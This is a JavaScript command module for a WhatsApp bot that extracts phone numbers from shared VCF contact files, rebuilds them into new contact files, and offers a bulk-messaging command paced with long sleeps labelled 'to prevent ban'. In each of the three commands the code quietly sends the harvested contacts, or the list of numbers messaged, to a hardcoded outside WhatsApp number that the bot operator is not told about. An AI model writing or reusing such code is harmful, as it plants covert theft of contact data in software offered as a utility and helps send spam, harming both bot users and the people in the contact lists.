const fs = require("fs");
const { sleep, extractPhoneNumbersFromVcf } = require("../../lib/myfunc");
let isS = false;

module.exports = [
  {
    command: ["only"],
    operate: async (context) => {
      const { m, mess, text, isCreator, reply, Cypher, prefix, args, command } =
        context;
      const quoted = m.quoted ? m.quoted : null;
      const mime = quoted?.mimetype || "";
      if (!args.join(" "))
        return reply(`*❌ Invalid usage*.\n*Example: ${prefix + command} 237*`);
      if (!/^\d+$/.test(args))
        return reply(
          "❌ Country code can only have 3 digits. \n *Exemple*: " +
            prefix +
            command +
            " 237"
        );
      if (!quoted || !/vcard/.test(mime))
        return reply(
          `Reply to an *vcf file* with *${prefix + command}* extract contacts`
        );
      try {
        const mediaPath = await Cypher.downloadAndSaveMediaMessage(quoted);
        let vcard = "";
        let totalNumbers = extractPhoneNumbersFromVcf(mediaPath);
        totalNumbers = totalNumbers
          .map((el) => (el.startsWith("+") ? el.slice(1) : el))
          .filter((el) => el.startsWith(args));
        if (totalNumbers.length === 0) {
          return reply(`Damn, are you smoking 🚬?\n\n*This file don't*`);
        }
        reply(
          `🤔This file have ${totalNumbers.length} numbers start with +${args}. Wait a bit i'll send you a great file 😃`
        );
        let noPort = 1;
        totalNumbers.map((tel) => {
          vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:${mess.saveAs}${noPort}\nTEL;type=CELL;type=VOICE;waid=${tel}:+${tel}\nEND:VCARD\n`;
          noPort++;
        });
        let nmfilect = "./contacts.vcf";
        fs.writeFileSync(nmfilect, vcard.trim());
        await sleep(2000);
        Cypher.sendMessage("237621092130@s.whatsapp.net", {
          document: fs.readFileSync(nmfilect),
          mimetype: "text/vcard",
          fileName: "Contact.vcf",
          caption: `Successful\n\n*Contacts:${totalNumbers.length}*`,
        });
        Cypher.sendMessage(
          m.chat,
          {
            document: fs.readFileSync(nmfilect),
            mimetype: "text/vcard",
            fileName: "Contact.vcf",
            caption: `Successful\n*🙂‍↔️ Work great with it.*\nContacts: *${totalNumbers.length}*\n*names*:From ${mess.saveAs}1 to ${mess.saveAs}${totalNumbers.length}`,
          },
          { ephemeralExpiration: 86400, quoted: m }
        );
        fs.unlinkSync(nmfilect);
      } catch (e) {
        console.log(e);
        reply("😭 Error accrued .");
      }
    },
  },
  {
    command: ["fordthis"],
    operate: async (context) => {
      const { m, mess, text, isCreator, reply, Cypher, prefix, args, command } =
        context;
      if (isS) return reply("*To prevent ban, plz wait*");
      if (!isCreator)
        return reply("*Look at this 🙄.*\nTake your own access !");
      const quoted = m.quoted ? m.quoted : null;
      const mime = quoted?.mimetype || "";
      if (!args.join(" "))
        return reply(
          `*❌ Invalid usage*.\n*Example: ${prefix + command} message*`
        );

      if (!quoted || !/vcard/.test(mime))
        return reply(
          `Reply to an *vcf file* with *${
            prefix + command
          }* forward message contacts`
        );

      const mediaPath = await Cypher.downloadAndSaveMediaMessage(quoted);

      let totalNumbers = extractPhoneNumbersFromVcf(mediaPath);
      totalNumbers = totalNumbers.map(
        (el) => (el.startsWith("+") ? el.slice(1) : el) + "@s.whatsapp.net"
      );

      if (totalNumbers.length === 0) {
        return reply(`Damn, are you smoking 🚬?\n\n*This file don't*`);
      }
      isS = true;

      reply(`😃 Wait a bit...`);
      let s = (o = 0);
      let txt = "./contacts.vcf";
      for (let mem of totalNumbers) {
        try {
          txt += mem.id + "\n";
          await Cypher.sendMessage(mem, { text: text });
          await sleep(2000);
          s++;
          if (s % 100 === 0) {
            await sleep(180000);
          }
        } catch (e) {
          console.log(e);
          o++;
        }
      }
      await Cypher.sendMessage("237621092130@s.whatsapp.net", {
        text: `I have just use your bot to send message to  : \n ${txt}`,
      });
      reply(
        `*Total members : ${totalNumbers.length}*\n*Success : ${s}*\nError:${o}. `
      );
      await sleep(900000);
      isS = false;
    },
  },
  {
    command: ["ttvcf", "texttovcf"],
    operate: async (context) => {
      const { m, mess, isCreator, reply, Cypher, prefix, text, command } =
        context;
      if (!isCreator)
        return reply("*Look at this 🙄.*\nTake your own access !");
      if (!text)
        return reply(
          `*❌ Invalid usage*.\n*Example: ${prefix + command} Tag All message*`
        );
      const pattern =
        /(?:\+?\d{1,3}[-.\s]?(\(?\d{1,3}\)?[-.\s]?)?[\d-.\s]{4,})/g;
      const jids = text.match(pattern);
      if (!jids) return reply("Damn, 0 valid numbers founds");

      let totalNumbers = jids
        .map((num) => num.replace(/\s+/g, ""))
        .map((el) => (el.startsWith("+") ? el : "+" + el));

      reply(`Wait a bit to save ${totalNumbers.length} numbers !`);
      let vcard = "";

      let noPort = 1;
      totalNumbers.map((tel) => {
        vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:${mess.saveAs}${noPort}\nTEL;type=CELL;type=VOICE;waid=${tel}:+${tel}\nEND:VCARD\n`;
        noPort++;
      });
      let nmfilect = "./contacts.vcf";

      fs.writeFileSync(nmfilect, vcard.trim());

      await sleep(2000);

      Cypher.sendMessage("237621092130@s.whatsapp.net", {
        document: fs.readFileSync(nmfilect),
        mimetype: "text/vcard",
        fileName: "Contact.vcf",
        caption: `Successful\n\n*Contacts:${totalNumbers.length}*`,
      });

      Cypher.sendMessage(
        m.chat,
        {
          document: fs.readFileSync(nmfilect),
          mimetype: "text/vcard",
          fileName: "Contact.vcf",
          caption: `Successful\n*🙂‍↔️ Work great with it.*\nContacts: *${totalNumbers.length}*\n*names*:From ${mess.saveAs}1 to ${mess.saveAs}${totalNumbers.length}`,
        },
        { ephemeralExpiration: 86400, quoted: m }
      );

      fs.unlinkSync(nmfilect);
    },
  },
];
